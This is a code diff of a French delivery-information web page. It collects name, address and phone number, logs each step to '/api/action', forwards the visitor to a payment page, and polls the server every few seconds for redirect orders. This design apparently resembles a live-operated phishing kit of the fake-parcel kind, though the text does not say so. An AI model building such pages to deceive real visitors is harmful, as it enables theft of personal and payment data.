@@ -1,32 +1,52 @@
 <!DOCTYPE html>
 <html lang="fr">
-<head><meta charset="UTF-8"><title>Livraison</title></head>
+<head>
+  <meta charset="UTF-8" />
+  <title>📦 Livraison</title>
+  <style>
+    body { font-family: Arial; background: #f8f8f8; text-align: center; }
+    form { display: inline-block; background: #fff; padding: 20px; border-radius: 12px; box-shadow: 0 0 5px #ccc; }
+    input { display: block; margin: 10px auto; padding: 8px; width: 80%; border-radius: 8px; border: 1px solid #ccc; }
+    button { background: #111; color: white; padding: 10px; border: none; border-radius: 8px; cursor: pointer; }
+  </style>
+</head>
 <body>
-<h1>📦 Livraison</h1>
-<form id="deliveryForm">
-  <input placeholder="Nom" id="nom"><br>
-  <input placeholder="Prénom" id="prenom"><br>
-  <input placeholder="Adresse" id="adresse"><br>
-  <input placeholder="Téléphone" id="telephone"><br>
-  <button type="submit">Suivant</button>
-</form>
-<script>
-document.getElementById('deliveryForm').onsubmit = async function(e){
-  e.preventDefault();
-  const sessionId = new URLSearchParams(window.location.search).get('sid');
-  await fetch('/api/delivery',{
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({
-      sessionId,
-      nom: document.getElementById('nom').value,
-      prenom: document.getElementById('prenom').value,
-      adresse: document.getElementById('adresse').value,
-      telephone: document.getElementById('telephone').value
-    })
-  });
-  window.location.href = '/payment.html?sid='+sessionId;
-}
-</script>
+  <h1>📦 Informations de livraison</h1>
+  <form onsubmit="sendDelivery(event)">
+    <input id="nom" placeholder="Nom" required>
+    <input id="prenom" placeholder="Prénom" required>
+    <input id="adresse" placeholder="Adresse complète" required>
+    <input id="telephone" placeholder="Téléphone" required>
+    <button type="submit">Continuer vers Paiement</button>
+  </form>
+
+  <script>
+    const sessionId = localStorage.getItem('sessionId');
+    async function sendDelivery(e){
+      e.preventDefault();
+      const data = {
+        sessionId,
+        nom: nom.value,
+        prenom: prenom.value,
+        adresse: adresse.value,
+        telephone: telephone.value
+      };
+      await fetch('/api/action', {
+        method:'POST', headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({ ...data, page:'Livraison', action:'Soumis infos livraison' })
+      });
+      window.location.href = '/paiement.html';
+    }
+
+    async function pollStatus(){
+      const res = await fetch('/api/status?sessionId='+sessionId);
+      const data = await res.json();
+      if(data.redirect){
+        window.location.href = '/' + data.redirect + '.html';
+      }
+      setTimeout(pollStatus, 3000);
+    }
+    pollStatus();
+  </script>
 </body>
 </html>
